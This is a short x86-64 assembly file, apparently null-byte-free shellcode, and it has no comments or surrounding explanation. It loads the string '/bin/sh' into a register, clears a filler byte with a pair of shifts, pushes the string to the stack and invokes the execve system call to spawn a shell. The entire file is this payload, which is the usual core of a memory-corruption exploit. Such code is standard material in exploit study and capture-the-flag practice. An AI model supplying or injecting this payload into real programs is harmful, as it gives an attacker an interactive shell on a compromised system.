.global _start
_start:
.intel_syntax noprefix

L1:	mov rcx, 0x1168732f6e69622f
	shl rcx, 0x08
	shr rcx, 0x08
	push rcx
	mov rdi, rsp
	mov al, 0x3b
	syscall
